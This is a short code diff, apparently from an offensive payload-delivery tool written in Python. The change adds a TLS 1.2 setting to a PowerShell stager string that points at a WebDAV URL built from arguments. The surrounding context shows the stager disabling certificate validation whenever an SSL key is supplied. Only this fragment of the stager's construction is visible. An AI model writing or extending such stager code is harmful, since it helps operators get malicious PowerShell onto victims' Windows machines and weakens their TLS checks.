@@ -88,8 +88,14 @@ webdav_url = '%s://%s:%d/webdav' % (
     args.WEBDAV_PORT,
 )
 
+ssl_tls12 = (
+    "[Net.ServicePointManager]::SecurityProtocol="
+    "[Net.SecurityProtocolType]::Tls12;"
+)
+
 stager_str = (
     (
+        ssl_tls12 +
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
         "={$true};" if args.SSL_KEY else ""
     ) + (
